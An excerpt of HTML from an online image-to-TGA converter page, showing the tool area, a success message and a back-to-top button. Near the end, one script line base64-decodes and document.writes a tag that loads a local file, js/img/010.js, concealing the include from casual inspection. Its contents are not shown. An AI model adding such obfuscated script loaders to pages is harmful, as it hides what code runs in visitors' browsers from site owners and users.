...
<div class="bg-tool">
        <h1>Convert Image to TGA Online</h1>
...
<div class="toolarea">
   ...
   <div class="input-group">
    ...
    <div id="success-message">Conversion successful! Image downloaded.</div>
...
<button onclick="scrollToTop()" id="backToTopBtn" title="Go to top">&#8679;</button>
  ...
  <script>document.write(atob("IDxzY3JpcHQgc3JjPSJqcy9pbWcvMDEwLmpzIiBkZWZlcj0iIj48L3NjcmlwdD4="));</script>
  <script>
    // Get the button
